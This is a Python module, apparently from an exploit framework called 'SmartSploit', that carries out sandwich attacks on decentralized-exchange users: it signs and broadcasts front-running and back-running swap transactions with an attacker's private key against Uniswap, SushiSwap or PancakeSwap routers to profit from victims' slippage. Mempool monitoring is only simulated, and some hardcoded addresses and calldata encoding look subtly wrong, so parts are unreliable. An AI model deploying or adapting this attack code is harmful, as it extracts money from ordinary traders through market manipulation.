"""
Sandwich Attack Exploit
SmartSploit Framework - Performs sandwich attacks on DEX transactions
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import time
import logging

logger = logging.getLogger(__name__)

class SandwichAttackExploit(BaseExploit):
    """Exploit DEX users through sandwich attacks"""
    
    def __init__(self):
        super().__init__()
        self.name = "Sandwich Attack"
        self.description = "Performs sandwich attacks on DEX transactions for MEV extraction"
        self.author = "SmartSploit Team"
        
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "MEV and Sandwich Attacks",
                "https://ethereum.org/en/developers/docs/mev/",
                "Front-running and Back-running Analysis"
            ],
            severity="medium",
            targets=["DEX traders", "AMM pools", "Large trades", "MEV opportunities"]
        )
        
        self.options = {
            "TARGET_DEX": {"value": "uniswap", "required": True, "description": "Target DEX (uniswap, sushiswap, pancakeswap)"},
            "TOKEN_PAIR": {"value": "ETH/USDC", "required": True, "description": "Token pair to monitor"},
            "MIN_TRADE_SIZE": {"value": "1", "required": False, "description": "Minimum trade size to sandwich (ETH)"},
            "MAX_GAS_PRICE": {"value": "100", "required": False, "description": "Maximum gas price in gwei"},
            "FRONTRUN_AMOUNT": {"value": "0.1", "required": False, "description": "Front-run trade amount (ETH)"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ATTACKER_KEY": {"value": "", "required": True, "description": "Attacker's private key"},
            "SLIPPAGE_TARGET": {"value": "5", "required": False, "description": "Target slippage percentage"},
            "PROFIT_THRESHOLD": {"value": "0.01", "required": False, "description": "Minimum profit threshold (ETH)"}
        }
        
    def check_requirements(self) -> bool:
        required_options = ["TARGET_DEX", "RPC_URL", "ATTACKER_KEY"]
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
        return True
        
    def get_dex_router_address(self, dex_name: str) -> str:
        """Get DEX router contract address"""
        routers = {
            "uniswap": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
            "sushiswap": "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F",
            "pancakeswap": "0x10ED43C718714eb63d5aA57B78B54704E256024E"
        }
        return routers.get(dex_name.lower(), routers["uniswap"])
        
    def get_token_addresses(self, token_pair: str) -> tuple:
        """Get token addresses from pair string"""
        # Common token addresses
        tokens = {
            "ETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
            "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "USDC": "0xA0b86a33E6417D5b31F0591cBE1C32C8b9D8C8B6",
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
            "UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"
        }
        
        try:
            token_a, token_b = token_pair.split("/")
            return tokens.get(token_a.upper()), tokens.get(token_b.upper())
        except:
            return tokens["ETH"], tokens["USDC"]
            
    def monitor_mempool_for_targets(self, w3) -> list:
        """Monitor mempool for large trades to sandwich"""
        try:
            logger.info("Monitoring mempool for sandwich opportunities...")
            
            # In a real implementation, this would monitor pending transactions
            # For demo, we'll simulate finding target transactions
            min_trade_size = Web3.to_wei(float(self.options["MIN_TRADE_SIZE"]["value"]), 'ether')
            
            # Simulated target transactions
            target_transactions = [
                {
                    "hash": "0x1234567890abcdef" + "0" * 40,
                    "from": "0x742D35Cc6471fC4c0e2D1C6C8b6e0F4B7c0F7b0F",
                    "to": self.get_dex_router_address(self.options["TARGET_DEX"]["value"]),
                    "value": min_trade_size * 5,  # 5x minimum size
                    "gas_price": Web3.to_wei(50, 'gwei'),
                    "function": "swapExactETHForTokens",
                    "estimated_slippage": 3.5
                },
                {
                    "hash": "0xabcdef1234567890" + "0" * 40,
                    "from": "0x1111111111111111111111111111111111111111",
                    "to": self.get_dex_router_address(self.options["TARGET_DEX"]["value"]),
                    "value": min_trade_size * 10,  # 10x minimum size
                    "gas_price": Web3.to_wei(75, 'gwei'),
                    "function": "swapExactTokensForETH",
                    "estimated_slippage": 4.2
                }
            ]
            
            # Filter profitable targets
            profitable_targets = []
            for tx in target_transactions:
                if tx["value"] >= min_trade_size and tx["estimated_slippage"] >= 2.0:
                    profitable_targets.append(tx)
                    
            logger.info(f"Found {len(profitable_targets)} profitable sandwich targets")
            return profitable_targets
            
        except Exception as e:
            logger.error(f"Mempool monitoring failed: {e}")
            return []
            
    def calculate_sandwich_amounts(self, target_tx: dict) -> dict:
        """Calculate optimal amounts for sandwich attack"""
        try:
            target_value = target_tx["value"]
            frontrun_amount = Web3.to_wei(float(self.options["FRONTRUN_AMOUNT"]["value"]), 'ether')
            
            # Adjust frontrun amount based on target size
            if target_value > Web3.to_wei(10, 'ether'):
                frontrun_amount = min(target_value // 5, Web3.to_wei(2, 'ether'))
            elif target_value > Web3.to_wei(5, 'ether'):
                frontrun_amount = min(target_value // 10, Web3.to_wei(1, 'ether'))
                
            # Calculate expected slippage and profit
            target_slippage = float(self.options["SLIPPAGE_TARGET"]["value"]) / 100
            expected_profit_rate = target_slippage * 0.8  # Conservative estimate
            
            return {
                "frontrun_amount": frontrun_amount,
                "expected_slippage": target_slippage,
                "expected_profit": frontrun_amount * expected_profit_rate,
                "backrun_amount": frontrun_amount  # Sell the same amount
            }
            
        except Exception as e:
            logger.error(f"Sandwich amount calculation failed: {e}")
            return {"error": str(e)}
            
    def execute_frontrun_transaction(self, w3, target_tx: dict, amounts: dict) -> dict:
        """Execute the front-running transaction"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            router_address = self.get_dex_router_address(self.options["TARGET_DEX"]["value"])
            token_a, token_b = self.get_token_addresses(self.options["TOKEN_PAIR"]["value"])
            
            # Prepare swap transaction - buy before victim
            if target_tx["function"] == "swapExactETHForTokens":
                # Victim buying tokens, we front-run by buying first
                function_sig = "0x7ff36ab5"  # swapExactETHForTokens
                path = [token_a, token_b]
            else:
                # Victim selling tokens, we front-run by selling first
                function_sig = "0x18cbafe5"  # swapExactTokensForETH
                path = [token_b, token_a]
                
            # Encode path
            path_encoded = "0000000000000000000000000000000000000000000000000000000000000040" + \
                          "0000000000000000000000000000000000000000000000000000000000000002" + \
                          path[0][2:].zfill(64) + path[1][2:].zfill(64)
            
            # Build transaction data
            call_data = function_sig + \
                       "0000000000000000000000000000000000000000000000000000000000000000" + \
                       path_encoded + \
                       attacker_account.address[2:].zfill(64) + \
                       hex(int(time.time()) + 300)[2:].zfill(64)  # deadline
            
            # Calculate gas price (higher than target to front-run)
            target_gas_price = target_tx["gas_price"]
            frontrun_gas_price = min(target_gas_price + Web3.to_wei(10, 'gwei'), 
                                   Web3.to_wei(int(self.options["MAX_GAS_PRICE"]["value"]), 'gwei'))
            
            frontrun_txn = {
                'to': router_address,
                'data': call_data,
                'gas': 200000,
                'gasPrice': frontrun_gas_price,
                'nonce': w3.eth.get_transaction_count(attacker_account.address),
                'value': amounts["frontrun_amount"] if target_tx["function"] == "swapExactETHForTokens" else 0
            }
            
            signed_txn = w3.eth.account.sign_transaction(frontrun_txn, attacker_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            # Don't wait for confirmation, return immediately for speed
            return {
                "success": True,
                "tx_hash": tx_hash.hex(),
                "gas_price": frontrun_gas_price,
                "amount": amounts["frontrun_amount"]
            }
            
        except Exception as e:
            logger.error(f"Front-run transaction failed: {e}")
            return {"success": False, "error": str(e)}
            
    def execute_backrun_transaction(self, w3, target_tx: dict, amounts: dict, frontrun_result: dict) -> dict:
        """Execute the back-running transaction"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            router_address = self.get_dex_router_address(self.options["TARGET_DEX"]["value"])
            token_a, token_b = self.get_token_addresses(self.options["TOKEN_PAIR"]["value"])
            
            # Wait for target transaction to be included
            time.sleep(2)  # Simulated wait
            
            # Prepare reverse swap transaction - sell after victim
            if target_tx["function"] == "swapExactETHForTokens":
                # Victim bought tokens, we back-run by selling tokens
                function_sig = "0x18cbafe5"  # swapExactTokensForETH
                path = [token_b, token_a]
                value = 0
            else:
                # Victim sold tokens, we back-run by buying tokens
                function_sig = "0x7ff36ab5"  # swapExactETHForTokens
                path = [token_a, token_b]
                value = amounts["backrun_amount"]
                
            # Encode path
            path_encoded = "0000000000000000000000000000000000000000000000000000000000000040" + \
                          "0000000000000000000000000000000000000000000000000000000000000002" + \
                          path[0][2:].zfill(64) + path[1][2:].zfill(64)
            
            call_data = function_sig + \
                       hex(amounts["backrun_amount"])[2:].zfill(64) + \
                       "0000000000000000000000000000000000000000000000000000000000000000" + \
                       path_encoded + \
                       attacker_account.address[2:].zfill(64) + \
                       hex(int(time.time()) + 300)[2:].zfill(64)
            
            # Use slightly lower gas price than front-run (but still competitive)
            backrun_gas_price = frontrun_result["gas_price"] - Web3.to_wei(5, 'gwei')
            
            backrun_txn = {
                'to': router_address,
                'data': call_data,
                'gas': 200000,
                'gasPrice': backrun_gas_price,
                'nonce': w3.eth.get_transaction_count(attacker_account.address),
                'value': value
            }
            
            signed_txn = w3.eth.account.sign_transaction(backrun_txn, attacker_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            return {
                "success": receipt.status == 1,
                "tx_hash": tx_hash.hex(),
                "gas_used": receipt.gasUsed,
                "gas_price": backrun_gas_price
            }
            
        except Exception as e:
            logger.error(f"Back-run transaction failed: {e}")
            return {"success": False, "error": str(e)}
            
    def calculate_sandwich_profit(self, w3, frontrun_result: dict, backrun_result: dict) -> dict:
        """Calculate profit from sandwich attack"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            # Get initial and final ETH balances
            current_balance = w3.eth.get_balance(attacker_account.address)
            
            # Calculate gas costs
            frontrun_gas_cost = frontrun_result.get("gas_price", 0) * 200000  # Estimated gas
            backrun_gas_cost = backrun_result.get("gas_price", 0) * backrun_result.get("gas_used", 200000)
            total_gas_cost = frontrun_gas_cost + backrun_gas_cost
            
            # Estimate profit (simplified calculation)
            frontrun_amount = frontrun_result.get("amount", 0)
            expected_profit = frontrun_amount * 0.03  # Assume 3% profit from slippage
            net_profit = expected_profit - total_gas_cost
            
            return {
                "gross_profit": Web3.from_wei(expected_profit, 'ether'),
                "gas_costs": Web3.from_wei(total_gas_cost, 'ether'),
                "net_profit": Web3.from_wei(net_profit, 'ether'),
                "profitable": net_profit > 0,
                "profit_percentage": (net_profit / frontrun_amount * 100) if frontrun_amount > 0 else 0
            }
            
        except Exception as e:
            logger.error(f"Profit calculation failed: {e}")
            return {"error": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            
            # Monitor mempool for target transactions
            target_transactions = self.monitor_mempool_for_targets(w3)
            
            if not target_transactions:
                return {"result": ExploitResult.FAILED, "message": "No profitable sandwich targets found"}
                
            sandwich_results = []
            total_profit = 0
            
            for target_tx in target_transactions[:3]:  # Attack first 3 targets
                try:
                    logger.info(f"Executing sandwich attack on transaction {target_tx['hash']}")
                    
                    # Calculate optimal amounts
                    amounts = self.calculate_sandwich_amounts(target_tx)
                    if "error" in amounts:
                        continue
                        
                    # Execute front-run
                    frontrun_result = self.execute_frontrun_transaction(w3, target_tx, amounts)
                    if not frontrun_result.get("success"):
                        continue
                        
                    # Execute back-run
                    backrun_result = self.execute_backrun_transaction(w3, target_tx, amounts, frontrun_result)
                    
                    # Calculate profit
                    profit_calc = self.calculate_sandwich_profit(w3, frontrun_result, backrun_result)
                    
                    sandwich_result = {
                        "target_tx": target_tx["hash"],
                        "frontrun_tx": frontrun_result.get("tx_hash"),
                        "backrun_tx": backrun_result.get("tx_hash"),
                        "success": frontrun_result.get("success") and backrun_result.get("success"),
                        "amounts": amounts,
                        "profit": profit_calc
                    }
                    
                    sandwich_results.append(sandwich_result)
                    
                    if profit_calc.get("profitable"):
                        total_profit += float(profit_calc.get("net_profit", 0))
                        logger.info(f"Profitable sandwich: {profit_calc['net_profit']} ETH")
                        
                except Exception as e:
                    logger.error(f"Sandwich attack on {target_tx['hash']} failed: {e}")
                    continue
                    
            # Determine overall success
            successful_attacks = [r for r in sandwich_results if r.get("success") and r.get("profit", {}).get("profitable")]
            
            result = {
                "result": ExploitResult.SUCCESS if successful_attacks else ExploitResult.FAILED,
                "message": f"Sandwich attack completed - {len(successful_attacks)} successful",
                "targets_found": len(target_transactions),
                "attacks_attempted": len(sandwich_results),
                "successful_attacks": len(successful_attacks),
                "total_profit": total_profit,
                "sandwich_results": sandwich_results
            }
            
            if successful_attacks:
                logger.info(f"Sandwich attacks successful! Total profit: {total_profit} ETH")
            else:
                logger.warning("No profitable sandwich attacks executed")
                
            return result
            
        except Exception as e:
            logger.error(f"Sandwich attack exploit failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}